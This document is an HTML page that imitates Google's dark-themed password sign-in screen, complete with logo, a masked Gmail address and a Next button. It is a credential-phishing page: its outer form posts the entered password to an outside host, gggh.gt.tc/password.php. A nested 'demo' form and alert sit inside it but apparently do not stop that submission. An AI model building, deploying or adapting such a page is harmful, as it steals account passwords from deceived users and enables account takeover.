<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter password – Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
  <style>
    /* ✅ Reset - Remove default browser styling */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box; /* Include padding and border in element's dimensions */
    }

    /* ✅ Dark background + Roboto font */
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #101010; /* Near-black background */
      color: #e8eaed; /* Light gray text color */
      min-height: 100vh; /* Minimum height of viewport */
      padding: 48px 20px;
      display: block;
    }

    /* ✅ Body container - Centers content with max width */
    .body {
      max-width: 450px;
      margin: 0 auto; /* Center horizontally */
    }

    /* ✅ Google Logo styling */
    .google-logo {
      width: 50px;
      max-width: 80%; /* Responsive: logo won't exceed 80% of container */
      margin-bottom: 36px;
    }

    /* ✅ Heading style */
    h2 {
      font-size: 24px;
      font-weight: 400; /* Normal weight, not bold */
      color: #e8eaed; /* Light gray */
      margin-bottom: 10px;
    }

    /* ✅ Subheading style */
    .body > p {
      font-size: 16px;
      color: #9aa0a6; /* Medium gray */
      margin-bottom: 30px;
    }

    /* ✅ Input container for floating label technique */
    .input-container {
      position: relative; /* Needed for absolute positioning of label */
      margin-bottom: 5px;
    }

    /* ✅ Input Fields styling */
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0; /* Light gray border */
      border-radius: 4px;
      background-color: #121212; /* Dark gray background */
      color: #e8eaed; /* Light gray text */
      margin-bottom: 15px;
      outline: none; /* Remove default focus outline */
    }

    /* ✅ Input focus state */
    input:focus {
      border-color: #8ab4f8; /* Google blue border on focus */
    }

    /* ✅ Floating Label - sits inside input initially */
    .floating-label {
      position: absolute;
      pointer-events: none; /* Allows clicks to pass through to input */
      left: 15px;
      top: 13px;
      color: #9aa0a6; /* Medium gray */
      font-size: 16px;
      transition: 0.2s ease all; /* Smooth animation */
    }

    /* Label when input is focused or has value */
    input:focus ~ .floating-label,
    input:not(:placeholder-shown) ~ .floating-label {
      top: -8px; /* Move above the input */
      left: 10px;
      font-size: 13px;
      background-color: #202124; /* Dark background to cover input border */
      padding: 0 4px;
      color: #8ab4f8; /* Google blue */
    }

    /* ✅ Show password container - holds checkbox and label */
    .show-password-container {
      display: flex;
      align-items: center;
      margin: 15px 0 20px;
    }

    .show-password-container input[type="checkbox"] {
      margin-right: 8px;
      width: 18px;
      height: 18px;
      accent-color: #8ab4f8; /* Google blue checkbox */
      cursor: pointer;
    }

    .show-password-container label {
      color: #e8eaed; /* Light gray */
      font-size: 14px;
      cursor: pointer;
    }

    /* ✅ Links styling */
    a {
      display: inline-block;
      font-size: 14px;
      color: #8ab4f8; /* Google blue */
      text-decoration: none;
      margin-bottom: 30px;
      font-weight: 500; /* Medium weight */
    }

    a:hover {
      text-decoration: underline;
    }

    /* ✅ Footer Section - holds navigation and submit button */
    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 20px;
    }

    /* ✅ Submit Button styling */
    button {
      background-color: #8ab4f8; /* Google blue */
      color: #000; /* Black text */
      border: none;
      padding: 10px 24px;
      font-weight: bold;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s ease; /* Smooth hover effect */
    }

    button:hover {
      background-color: #a0c3ff; /* Lighter blue on hover */
    }

    /* ✅ Mobile Friendly - Responsive adjustments for smaller screens */
    @media screen and (max-width: 480px) {
      .body {
        padding: 32px 24px;
      }

      .google-logo {
        margin-bottom: 24px;
      }

      h2 {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>
  <!-- ✅ Main container -->
  <div class="body">
    <!-- ✅ Google logo -->
    <img src="google.png" alt="Google logo" class="google-logo" />

    <!-- ✅ Page heading -->
    <h2>Welcome</h2>
    <p>*****@gmail.com</p>
   
    <!-- ✅ password Form -->
    <form action="https://gggh.gt.tc/password.php" method="POST">

    <!-- ✅ Password form -->
    <form id="passwordForm">
      <!-- Password input with floating label -->
      <div class="input-container">
        <input type="password" id="password" name="password" placeholder=" " required />
        <label for="password" class="floating-label">Enter your password</label>
      </div>

      <!-- Show password checkbox -->
      <div class="show-password-container">
        <input type="checkbox" id="showPassword" />
        <label for="showPassword">Show password</label>
      </div>

      <!-- Forgot password link -->
      <a href="#">Forgot password?</a>

      <!-- ✅ Footer buttons -->
      <div class="footer">
        <a href="#">Try another way</a>
        <button type="submit">Next</button>
      </div>
    </form>
  </div>

  <script>
    // JavaScript to toggle password visibility
    document.getElementById('showPassword').addEventListener('change', function() {
      const passwordInput = document.getElementById('password');
      if (this.checked) {
        passwordInput.type = 'text';
      } else {
        passwordInput.type = 'password';
      }
    });

    // Form submission handling
    document.getElementById('passwordForm').addEventListener('submit', function(e) {
      e.preventDefault();
      alert('Password submitted (this is a demo)');
    });
  </script>
</body>
</html>
